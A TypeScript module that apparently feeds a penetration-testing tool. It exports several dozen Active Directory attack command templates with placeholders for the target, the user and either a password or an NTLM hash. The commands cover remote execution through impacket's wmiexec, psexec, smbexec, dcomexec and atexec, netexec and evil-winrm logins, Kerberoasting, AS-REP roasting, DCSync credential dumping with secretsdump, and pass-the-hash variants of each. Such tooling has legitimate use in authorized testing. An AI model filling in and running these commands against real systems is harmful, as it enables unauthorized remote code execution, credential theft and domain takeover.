interface Command {
  template: string;
  authType: "password" | "ntlmHash";
}

const domainCommands: Command[] = [
  {
    template:
      "impacket-wmiexec '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-psexec '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-smbexec '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-dcomexec '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-atexec '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-smbclient '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-mssqlclient '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "nxc smb '{targetHost}' -u '{username}' -p '{password}'",
    authType: "password",
  },
  {
    template:
      "nxc ssh '{targetHost}' -u '{username}' -p '{password}'",
    authType: "password",
  },
  {
    template:
      "nxc ldap '{targetHost}' -u '{username}' -p '{password}'",
    authType: "password",
  },
  {
    template:
      "nxc ftp '{targetHost}' -u '{username}' -p '{password}'",
    authType: "password",
  },
  {
    template:
      "nxc wmi '{targetHost}' -u '{username}' -p '{password}'",
    authType: "password",
  },
  {
    template:
      "nxc winrm '{targetHost}' -u '{username}' -p '{password}'",
    authType: "password",
  },
  {
    template:
      "nxc rdp '{targetHost}' -u '{username}' -p '{password}'",
    authType: "password",
  },
  {
    template:
      "nxc vnc '{targetHost}' -u '{username}' -p '{password}'",
    authType: "password",
  },
  {
    template:
      "nxc mssql '{targetHost}' -u '{username}' -p '{password}'",
    authType: "password",
  },
  {
    template:
      "nxc nfs '{targetHost}' -u '{username}' -p '{password}'",
    authType: "password",
  },
  {
    template:
      "xfreerdp /u:'{username}' /d:'{domain}' /p:'{password}' /v:'{targetHost}' /drive:.,linux /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache",
    authType: "password",
  },
  {
    template:
      "bloodhound-python -d '{domain}' -ns '{targetHost}' -u '{username}' -p '{password}' -c all",
    authType: "password",
  },
  {
    template: "evil-winrm -u '{username}' -p '{password}' -i '{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-GetUserSPNs -request -dc-ip '{targetHost}' '{domain}'/'{username}':'{password}' -outputfile hashes.kerberoast",
    authType: "password",
  },
  {
    template:
      "impacket-GetNPUsers -request -dc-ip '{targetHost}' '{domain}'/'{username}':'{password}'",
    authType: "password",
  },
  {
    template:
      "impacket-secretsdump -outputfile 'dcsync.dump' '{domain}'/'{username}':'{password}'@'{targetHost}'",
    authType: "password",
  },
  {
    template:
      "rpcclient -U '{domain}/{username}' --password '{password}' '{targetHost}'",
    authType: "password",
  },
  {
    template:
      "impacket-wmiexec '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-psexec '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-smbexec '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-dcomexec '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-atexec '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-smbclient '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-mssqlclient '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
 {
    template:
      "nxc smb '{targetHost}' -u '{username}' -H '{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "nxc ssh '{targetHost}' -u '{username}' -H '{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "nxc ldap '{targetHost}' -u '{username}' -H '{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "nxc ftp '{targetHost}' -u '{username}' -H '{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "nxc wmi '{targetHost}' -u '{username}' -H '{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "nxc winrm '{targetHost}' -u '{username}' -H '{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "nxc rdp '{targetHost}' -u '{username}' -H '{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "nxc vnc '{targetHost}' -u '{username}' -H '{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "nxc mssql '{targetHost}' -u '{username}' -H '{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "nxc nfs '{targetHost}' -u '{username}' -H '{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "xfreerdp /u:'{username}' /d:'{domain}' /pth:'{ntlmHash}' /v:'{targetHost}' /cert-ignore /dynamic-resolution",
    authType: "ntlmHash",
  },
  {
    template: "evil-winrm -u '{username}' -H '{ntlmHash}' -i '{targetHost}'",
    authType: "ntlmHash",
  },
  {
    template: "bloodhound-python -d '{domain}' -ns '{targetHost}' -u '{username}' --hashes '{ntlmHash}' -c all",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-GetUserSPNs -request -dc-ip '{targetHost}' '{domain}'/'{username}' -hashes '00:{ntlmHash}' -outputfile hashes.kerberoast",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-GetNPUsers -request -dc-ip '{targetHost}' '{domain}'/'{username}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "impacket-secretsdump -outputfile 'dcsync.dump' '{domain}'/'{username}'@'{targetHost}' -hashes '00:{ntlmHash}'",
    authType: "ntlmHash",
  },
  {
    template:
      "rpcclient -U '{domain}/{username}' --pw-nt-hash '{ntlmHash}' '{targetHost}'",
    authType: "ntlmHash",
  },
];

export default domainCommands;
